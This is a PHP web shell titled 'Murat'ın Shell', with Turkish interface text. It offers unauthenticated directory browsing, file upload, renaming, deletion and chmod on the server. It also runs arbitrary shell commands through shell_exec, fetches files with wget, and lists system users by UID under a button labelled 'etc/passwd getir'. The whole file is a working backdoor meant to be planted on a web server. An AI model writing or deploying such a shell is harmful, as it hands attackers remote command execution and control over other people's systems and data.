<?php 
$base_dir = __DIR__;
$current_dir = isset($_GET['dir']) ? $_GET['dir'] : $base_dir;

echo "<h1>Murat'ın Shell</h1>";
echo "<h1>$current_dir</h1>";

echo "<form action='webshell.php' method='post' enctype='multipart/form-data'>";
echo "<input type='file' name='file' />";
echo "<input type='submit' name='guncelle' value='Guncelle' />";
echo "</form>";

//dosya yükleme komutları

if(isset($_FILES['file'])){
    $upload_file = $current_dir . '/' . $_FILES['file']['name'];
    if(move_uploaded_file($_FILES['file']['tmp_name'], $upload_file)){
        echo "Dosya yüklendi";
    }
}

//dosya ismini düzenleme komutları
if(isset($_POST['rename'])){
   $old_file_name = $current_dir . '/' . $_POST['old_name'];
   $new_file_name = $current_dir . '/' . $_POST['new_name'];
   if(rename($old_file_name, $new_file_name)){
       echo "Dosya yeniden adlandırıldı";
   }
}

//dizin değiştirme komutları
echo "<form  method='get'>";
echo "<input type='text' name='dir', value='$current_dir' />";
echo "<input type='submit' name='dizin' value='Dizin' />";
echo "</form>";

//komut çalıştırma
echo "<form method='post'>";
echo "<input type='text' name='command' value='' />";
echo "<input type='submit' name='komut' value='Komut' />";
echo "</form>";

//dosya arama
echo "<form method='get'>";
echo "<input type='text' name='search' value='' />";
echo "<input type='submit' name='arama' value='$current_dir' />";
echo "</form>";

echo "<h2>Dosyalar</h2>";
$files = scandir($current_dir);
$search_query = isset($_GET['search']) ? $_GET['search'] : '';

foreach($files as $file){
    if($search_query == '' || strpos($file, $search_query) !== false){
        echo "<a href='webshell.php?dir=$current_dir/$file'>$file</a><br>";
    }

    $file_path = $current_dir . '/' . $file;

    $permissions = substr(sprintf('%o', fileperms($file_path)), -4);
    
    echo "<form method='post' style='display: inline-block; margin-right: 5px;'>";
    echo "<input type='hidden' name='file_name' value='$file' />";
    echo "<input type='submit' name='delete' value='Sil' />";
    echo "</form>";


    echo "<form method='post' style='display: inline-block; margin-right: 5px;'>";
    echo "<input type='hidden' name='old_name' value='$file' />";
    echo "<input type='text' name='new_name' value='$file' />";
    echo "<input type='submit' name='rename' value='Düzenle' />";
    echo "</form>";
}

if(isset($_POST['command'])){
    $command = $_POST['command'];

    switch($command){
        case 'list':
            $files = scandir($current_dir);
            foreach($files as $file){
                echo "$file<br>";
            }
            break;
            case 'help':
                echo "Komutlar:<br>";
                echo  "<ul>";
                echo "list: Dosyaları listeler.<br>";
                echo "chmod: Dosya izinlerini değiştirir.<br>";
                echo "delete: Dosyayı siler.<br>";
                echo "download: Dosyayı indirir.<br>";
                echo "ls: Dosyaları listeler.<br>";
                echo "pwd: Cihazın konumunu listeler.<br>";
                echo "clear: Ekranı temizler.<br>";
                echo "</ul>";
                break;
        case 'chmod':
            $file = $current_dir . '/' . $_POST['file_name'];
            $permissions = $_POST['permissions'];
            chmod($file, $permissions);
            break;
        case 'delete':  
            $file = $current_dir . '/' . $_POST['file_name'];
            unlink($file);
            break;  
        case 'download':
            $file = $current_dir . '/' . $_POST['file_name'];
            $output = shell_exec("wget $file");
            break;
        case 'ls':
            $output = shell_exec('ls -la');
            break;
        case 'pwd':
            $output = shell_exec('pwd');
            break;
        case 'clear':
            $output = shell_exec('clear');
            break;
        default:
            $output = shell_exec($command);
            break;
    }

    echo "<pre>$output</pre>";
}

echo "<form method='post'>";
echo "<input type='submit' name='get_users' value='etc/passwd getir' />";
echo "</form><br>";

if(isset($_POST['get_users'])){
    echo "<h2>etc/passwd görüntüle</h2>";
    for ($i=1; $i <=2000; $i++) {
        $user_info = posix_getpwuid($i);
        if($user_info){
            echo "UID: " .  $user_info['uid'] . " - " . $user_info['name'] . "<br>";
        } 
        }
}

?>
